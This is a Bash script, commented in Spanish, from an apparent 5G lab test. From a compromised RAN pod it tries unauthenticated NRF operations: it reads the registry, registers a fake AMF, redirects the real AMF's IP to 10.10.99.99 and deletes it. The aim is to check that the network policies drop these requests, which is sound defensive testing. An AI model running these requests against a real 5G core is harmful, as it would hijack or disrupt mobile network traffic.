#!/bin/bash
# a2-nrf-desde-la-ran.sh — A2: suplantar NF en el NRF desde la RAN.
#
# El pod comprometido de 5g-ran intenta las cuatro operaciones de
# Nnrf_NFManagement (TS 29.510) sin credenciales: leer el registro, registrar
# un AMF falso, desviar el AMF real a otra IP y borrarlo.
#
# Esperado con las políticas del lab: ninguna llega al NRF (DROPPED en Hubble).
# Sin políticas, el NRF las acepta: así se secuestra el tráfico del core.
#
# Uso (desde node-master):
#   kubectl apply -f attacks/attacker-ran.yaml
#   bash attacks/a2-nrf-desde-la-ran.sh
set -uo pipefail
NS=5g-ran
POD=attacker-ran
NRF="http://open5gs-cp-nrf-sbi.5g-cp.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances"
FALSO=ffffffff-aaaa-bbbb-cccc-000000000001

echo "=== A2: NRF desde ${NS}/${POD} | $(date -u) ==="
kubectl -n "$NS" wait --for=condition=Ready "pod/${POD}" --timeout=120s >/dev/null

pedir() {  # pedir <descripción> <argumentos de curl...>
  local desc="$1"; shift
  printf '%-34s ' "$desc"
  kubectl -n "$NS" exec "$POD" -- curl -s --max-time 5 --http2-prior-knowledge \
    -o /dev/null -w "HTTP %{http_code}\n" "$@" || echo "sin respuesta"
}

AMF_ID=$(kubectl -n "$NS" exec "$POD" -- curl -s --max-time 5 --http2-prior-knowledge \
  "${NRF}?nf-type=AMF" 2>/dev/null | grep -o '[0-9a-f-]\{36\}' | head -1)
AMF_ID="${AMF_ID:-00000000-0000-0000-0000-000000000000}"

pedir "READ  (listar NF)" "$NRF"
pedir "CREATE (AMF falso)" -X PUT "${NRF}/${FALSO}" -H 'Content-Type: application/json' \
  -d "{\"nfInstanceId\":\"${FALSO}\",\"nfType\":\"AMF\",\"nfStatus\":\"REGISTERED\",\"ipv4Addresses\":[\"10.10.99.99\"]}"
pedir "UPDATE (desviar el AMF real)" -X PATCH "${NRF}/${AMF_ID}" \
  -H 'Content-Type: application/json-patch+json' \
  -d '[{"op":"replace","path":"/ipv4Addresses/0","value":"10.10.99.99"}]'
pedir "DELETE (borrar el AMF real)" -X DELETE "${NRF}/${AMF_ID}"
